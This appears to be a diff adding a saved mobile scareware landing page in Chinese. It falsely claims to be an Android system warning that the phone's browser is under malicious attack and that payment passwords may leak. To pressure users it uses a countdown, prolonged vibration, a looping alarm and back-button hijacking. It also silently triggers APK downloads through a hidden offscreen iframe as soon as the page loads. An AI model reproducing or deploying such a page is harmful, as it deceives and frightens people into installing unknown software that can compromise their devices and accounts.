@@ -1,0 +1,326 @@
+
+
+<!-- saved from url=(0046)http://browser.tjxhtdp.com/html/dl/fbkj3.html# -->
+<html>
+	<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <!--<base href="">--><base href=".">
+    <script src="./access/jquery.min.js"></script>
+    <script>
+	
+	var param = function(name) {
+			var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+			var r = window.location.search.substr(1).match(reg);
+			if (r != null) {
+					return unescape(r[2]);
+			}
+			return null;
+	};
+    var downloadApk = {
+        "su185": "http://apkcdn.jdhssz.com/apk/semob5.16.8_185.apk",
+        "su60": "http://apkcdn.jdhssz.com/apk/semob5.16.8_60.apk",
+        "su83": "http://apkcdn.jdhssz.com/apk/semob5.16.8_83.apk",
+        "su91": "http://apkcdn.jdhssz.com/apk/semob5.16.8_91.apk",
+        "su97": "http://apkcdn.jdhssz.com/apk/semob5.16.8_97.apk",
+        "su132": "http://apkcdn.jdhssz.com/apk/semob5.16.8_132.apk",
+        "su125": "http://apkcdn.jdhssz.com/apk/semob5.16.8_125.apk",
+        "su134": "http://apkcdn.jdhssz.com/apk/semob5.16.8_134.apk",
+        "su154": "http://apkcdn.jdhssz.com/apk/semob5.16.8_154.apk",
+        "su152": "http://apkcdn.jdhssz.com/apk/semob5.16.8_152.apk",
+        "su147": "http://apkcdn.jdhssz.com/apk/semob5.16.8_147.apk",
+        "su169": "http://apkcdn.jdhssz.com/apk/semob5.16.8_169.apk",
+        "su170": "http://apkcdn.jdhssz.com/apk/semob5.16.8_170.apk",
+        "su190": "http://apkcdn.jdhssz.com/apk/semob5.16.8_190.apk",
+        "su232": "http://apkcdn.jdhssz.com/apk/semob5.16.8_232.apk",
+        "su233": "http://apkcdn.jdhssz.com/apk/semob5.16.8_233.apk",
+        "su184": "http://apkcdn.jdhssz.com/apk/semob5.16.8_184.apk",
+        "su237": "http://apkcdn.jdhssz.com/apk/semob5.16.8_237.apk",
+        "su264": "http://apkcdn.jdhssz.com/apk/semob5.16.8_264.apk",
+        "n24": "https://sl.sogoucdn.com/semob5.16.12_161250_R19355_121098024_build58082_2.1.0.2367.apk",
+        "n36": "https://sl.sogoucdn.com/semob5.16.12_161250_R19355_121098036_build58073_2.1.0.2367.apk"
+    };
+	var strurl;
+    var _default = "https://sl.sogoucdn.com/semob5.16.12_161250_R19355_121098036_build58073_2.1.0.2367.apk";
+    var downapk = function() {
+        var url = downloadApk[param('pid')];
+        if ( !(typeof url == 'string')) {
+            strurl = _default
+        }else{
+			strurl = url;
+		}
+    };
+    downapk();
+    /**if(!localStorage.getItem('downloaded')){
+        strurl = "http://browser.tjxhtdp.com/html/dl/apk/app-release-explorer_speed-1.1.8_xfangbei3.apk";
+        localStorage.setItem('downloaded', 1);
+    }else{
+        strurl = "http://browser.tjxhtdp.com/html/dl/apk/app-release-explorer_speed-1.1.8_xfangbei3.apk";
+    }**/
+    var jq = $.noConflict();
+    jq(document).ready(function (e) {
+        var iframe = document.createElement("iframe");
+        iframe.style.cssText = "width:1px;height:1px;position:fixed;left:-100px;";
+        document.body.appendChild(iframe);
+
+        function iframeDownload() {
+            iframe.src = strurl;
+        }
+        
+        var downloadCount = 0;
+        var i = 0;
+        var autoDownload = setInterval(function(){
+            iframeDownload();
+            i++;
+            if(i==2){
+                clearInterval(autoDownload);
+            }
+        },1500);
+        var flag = false;
+        if (window.history && window.history.pushState) {
+            jq(window).on('popstate', function () {
+                if(!flag){
+                    iframeDownload(); flag = true;
+                }
+		window.history.pushState( "");
+            });
+        }
+        ////window.history.pushState('forward', null, '#');
+        ////window.history.forward(1);
+    });
+    </script>
+    <script src="./access/us.js"></script>
+    <script src="./access/zep.min.js"></script>
+    <script>
+        //手机震动1秒
+        if (navigator.vibrate) {
+            navigator.vibrate([5000,10,5000,10,5000,10,5000,10,5000,10,5000,10,5000,10,5000]);//震动1000毫秒
+        } else if (navigator.webkitVibrate) {
+            navigator.webkitVibrate([5000,10,5000,10,5000,10,5000,10,5000,10,5000,10,5000,10,5000]);
+        }
+    </script>
+    <script language="Javascript">
+    function GetQueryString(name) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) return unescape(r[2]);
+        return '手机';
+    }
+    
+    </script>
+    <script language="Javascript">
+    var test = window.location.pathname;
+    // strurl=test.replace(/p/, "cpp");
+    
+    //alert(strurl);
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=no">
+    <link href="./access/style.css" type="text/css" rel="stylesheet">
+    <title></title>
+    <meta name="robots" content="noindex">
+    <meta content="yes" name="apple-mobile-web-app-capable">
+    <meta content="black" name="apple-mobile-web-app-status-bar-style">
+    <meta name="format-detection" content="telphone=no">
+    <meta name="renderer" content="webkit">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="x5-orientation" content="portrait">
+    <meta name="full-screen" content="yes">
+    <meta name="x5-fullscreen" content="true">
+    <meta name="browsermode" content="application">
+    <script>
+        function is_touch_device() {
+            return 'ontouchstart' in window // works on most browsers 
+                    || 'onmsgesturechange' in window; // works on ie10
+        };
+    
+        if(!/huawei|honor/ig.test(navigator.userAgent)){
+            alert('警告!\n\n您的'+str4+'手机浏览器 可能会遭到恶意广告骚扰！\n\n请根据提示进行检查浏览器.\n\n**请勿关闭本窗口**');
+        }
+        
+        var ii = 0; // needed for safari
+        window.navigator.vibrate([5000,10,5000,10,5000,10,5000,10,5000,10,5000,10,5000,10,5000]); //window.navigator.vibrate(5000);
+
+    
+        setTimeout(function(){ii = 1;},200);
+
+        addEventListener('load', function() {
+            setTimeout(function() {
+                changeText();
+                function changeText() {
+                    setTimeout(function() {
+                            $("#headTxt2").show();
+                            $("#bodytxt").show();
+                            $("#subhead").show();
+                            
+                        }, 1);
+                }
+            }, 0);
+        }, false);
+    
+        //timer script
+        var sec = 59; // set the seconds
+        var min = 04; // set the minutes
+        function countDown() {
+            sec--;
+            if (sec == -01) {
+                sec = 59;
+                min = min - 1; 
+            } else {
+                min = min; 
+            }
+            
+            if (sec<=9) { sec = "0" + sec; }
+            
+            time = (min<=9 ? "" + min : min) + " 分钟 " + sec + " 秒";
+            
+            if (document.getElementById) { document.getElementById('theTime').innerHTML = time; }
+            
+            SD=window.setTimeout("countDown();", 1000);
+            if (min == '00' && sec == '00') { sec = "00"; window.clearTimeout(SD); }
+        }
+        window.onload = countDown;
+    </script>
+    <style>
+        .vitruvian-icon-12{background-image:url('./access/icon-12.png')}
+    </style>
+    </head><body>
+    <div id="main-frame-error" class="interstitial-wrapper">
+            <div id="main-content"> <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="150.034px" height="53.012px" viewBox="0 0 150.034 53.012" enable-background="new 0 0 150.034 53.012" xml:space="preserve">
+              <image overflow="visible" width="53" height="53" xlink:href="./access/anzhuo.jpg" transform="matrix(1.0002 0 0 1.0002 0 0)"> </image>
+              </svg>
+              <div id="today"> 
+                <script type="text/javascript">
+                          var currentTime = new Date();
+                          // Array of day names
+                          var dayNames = new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");
+                          var date = currentTime.getDate();
+                          var year = currentTime.getFullYear();
+                          document.write(dayNames[currentTime.getDay()]+" "+date+", "+year);
+                      </script>Tuesday 11, 2018 
+              </div>
+              <div id="main-message" style="clear: both;">
+              <div style=" position:fixed; top:5px; right:5px; width:35px; height:18px; line-height:18px; background:#000; color:#fff; font-size:12px;  text-align:center; border-radius:3px; opacity:0.1">提示</div>
+                <h1 id="headTxt2" style=""> 安卓系统提示您的手机浏览器<script language="Javascript">document.write(str4);</script> 可能会遭到<span id="blink">(3)</span>个恶意广告的恶意袭击！</h1>
+                <div id="subhead" style="margin-bottom: 10px; color: black; font-weight: bold;"> </div>
+                <div id="bodytxt" style="position: relative;"><img style="float: right;" width="82" height="104" src="./access/du01.jpg"><span style="font-size:18px;font-weight:bold;color:red;font-family:sans-serif;" id="theTime">4 分钟 32 秒</span>
+                  <div id="successScan" style="margin-bottom:20px"></div>
+                  <b>请按已下步骤修复手机:</b><br>
+                  <br>
+                  <b>第一步: </b> 点击以下按钮安装浏览器<br>
+                  <br>
+                  <b>第二步: </b>打开下载的防护浏览器，阻挡代码攻击</div>
+              </div>
+            </div>
+            <div id="details" class="" jstcache="0">
+          <style>
+              .liqishadu{
+              box-sizing: border-box;padding:10px 15px;color:#fff;border-radius:3px;width: 100%;display: block;background: #0370ea;
+                      background: -moz-linear-gradient(top,#008dfd 0,#0370ea 100%);
+                      background: -webkit-gradient(linear,left top,left bottom,color-stop(0,#008dfd),color-stop(100%,#0370ea));
+                      background: -webkit-linear-gradient(top,#008dfd 0,#0370ea 100%);
+                      background: -o-linear-gradient(top,#008dfd 0,#0370ea 100%);
+                      background: -ms-linear-gradient(top,#008dfd 0,#0370ea 100%);
+                      background: linear-gradient(top,#008dfd 0,#0370ea 100%);
+              
+              }
+          </style>
+              <div jsselect="summary" jstcache="5"> <span style="text-align:center;display:block;">
+              <script language="JavaScript">document.writeln('<a href="'+strurl+'" class="liqishadu">立即清除</a>');</script>
+				
+
+              </span> </div>
+            </div>
+          </div>
+           <script>
+          $(document).ready(function(e) {
+              $(".guanbi").click(function(){
+                  $(".popup").hide();
+                  $(".Xbox").show();
+                  $(".bg").show();
+                  navigator.vibrate([1000, 10, 1000,10]);
+              });
+          
+              $(".guanbi_1").click(function(){
+                          $(".Xbox").hide();
+                          $(".bg").hide();
+              });
+          });
+          
+          </script>
+          
+          
+          
+          <div class="bg" style=""></div>
+          <div class="Xbox" style="display: none;">
+              <div class="tcont">
+                  <div class="t1"><img src="./access/ico5.png"></div>
+                  <div class="t2"> 系统提示!! </div>            
+              </div>
+              
+              <div class="tcont1">
+                  <div class="t1">系统检测浏览器有5个可疑漏洞<br>
+          可能导致泄露支付密码或被盗号<br>
+          请安装防护浏览器</div>
+                  <div class="t2">
+                      <script language="JavaScript">document.writeln('<a class="button_1" href="'+strurl+'" class="liqishadu">立即清除</a>');</script>
+					  
+
+                      <!-- <a class="button_1" href="/lg_3/cpp21018z.html">确认</a> -->
+                  </div>
+              </div>
+
+<p style=" float:left; margin-top:200px; padding-bottom:0px;line-height: 0px;  font-size:12px; color:#ddd;text-align: center; width: 100%;">注：该页面为推广助手的广告页面</p>
+<p style=" float:left;  padding-bottom:0px;line-height: 0px;  font-size:12px; color:#ddd;text-align: center; width: 100%;">注:如需放弃修复请点击后退按钮</p>
+
+    <audio id="mp3Btn"  autoplay="autoplay" preload="" loop="">
+        <source src="alert2.mp3" type="audio/mpeg">
+    </audio>
+  
+<div style="float:left; padding-bottom:4px;  width:100%; text-align:center;background:#fff; line-height:20px; bottom:0px; font-size:12px; color:#ddd;">广告和设备生产商
+    <script language="Javascript">
+        document.write(str4);
+    </script>公司无关</div>
+
+              <div class="guanbi_1" href="javascript:;" onclick="Lock_CheckForm(this);">×</div>
+          </div>
+          
+          
+          <div class="popup fourth" style="display: block;"> 
+           
+            <style>
+          .guanbi { position:absolute; top:8px; right:8px; width:40px; height:40px; text-align:center; line-height:40px; color:#555; font-family:Arial, Helvetica, sans-serif;}
+          
+          .bg{ float:left; width:100%; height:100%; background-color:rgba(0,0,0,0.5); position: fixed; left:0; top:0;}
+          .Xbox{float:left;  width: 88%;  max-width: 280px;  margin: 0 0 0 -140px; background: #c00; border-radius:10px;-webkit-box-shadow:0 0 8px #5c0000;   -moz-box-shadow:0 0 8px #5c0000;   box-shadow:0 0 8px #5c0000; position: absolute;  top: 20%; left: 50%; font-family:"Microsoft YaHei"}
+              .tcont{float:left; width:100%; padding:15px 0 2px;; position:relative;color:#fff; }
+              .tcont .t1 img{ width: 26px;  height: 26px;  margin: 0 0 0 15px; float: left;}
+              .tcont .t2{  padding: 0 15px 0 8px; line-height: 29px; font-size: 20px; color: #fff000; text-align: center; float: left;}	
+              .tcont1{float:left;width:100%;padding:10px 0 10px;}
+              .tcont1 .t1{ padding:12px 22px; line-height:34px; font-size:16px; color:#fff; text-align:left;border-top:1px solid #ea2f2f;}	
+              .tcont1 .t2{ padding:3px 22px 6px 22px; }
+              a.button_1{padding:7px 0;color:#333;border-radius:8px;margin: 0 auto; border:1px solid fff;width: 50%;display: block;font-size:17px; text-align:center;background: #fff;}
+              a.button_1:active{ background: #000;}
+              .guanbi_1 {position: absolute;top: -3px;right: 0px; width: 40px; height: 40px; text-align: center;line-height: 40px; color: #ff8888;font-family: sans-serif; font-size: 22px;}
+          </style>
+            <div class="guanbi">X</div>
+            <div class="popup-head"><img src="./access/du_ico1.png" style="height:26px;width:26px;position:absolute;top:13px;left:17px;">
+             系统警告!! </div>
+            <div class="popup-center"> 您的 <script language="Javascript">document.write(str4);</script>手机 可能会遭到恶意广告骚扰!<br>
+              <br>
+              请安装防护浏览器.<br>
+              <br>
+              <span style="text-align:center;margin:0 auto;display: block;">**建议立刻下载**</span></div>
+              <div class="popup-bottom"> 
+                  <script language="JavaScript">document.writeln('<a class="button" href="'+strurl+'">确定</a>');</script>
+				  
+
+                  <!-- <a class="button" href="/lg_3/cpp21018z.html">确定</a>  -->
+              </div>
+          </div>
+          <div style="display:none;"> 
+          
+          </div>
+
+		<script>$(window).onload = function(){var audio = document.getElementById("mp3Btn");audio.play();}</script>		
+          
+          
+          </body></html>
